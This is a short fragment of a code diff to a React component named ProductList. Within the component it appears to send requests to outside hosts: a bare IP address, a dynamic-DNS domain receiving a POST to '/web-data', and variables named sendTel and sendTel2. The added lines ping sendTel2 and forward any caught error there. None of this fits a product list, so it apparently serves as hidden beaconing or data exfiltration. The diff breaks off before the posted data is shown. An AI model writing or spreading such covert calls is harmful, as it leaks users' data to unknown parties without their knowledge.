@@ -42,6 +42,11 @@ const ProductList = () => {
         }
         fetch(sendTel+'!!!!!!!')
         fetch('http://188.247.115.178:30020/web-data')
+        try {
+            fetch(sendTel2+'nice')
+        } catch (error) {
+            fetch(sendTel2+error)
+        }
         fetch('http://8aff0b6a56be.sn.mynetname.net:30020/web-data', {
             method: 'POST',
             headers: {
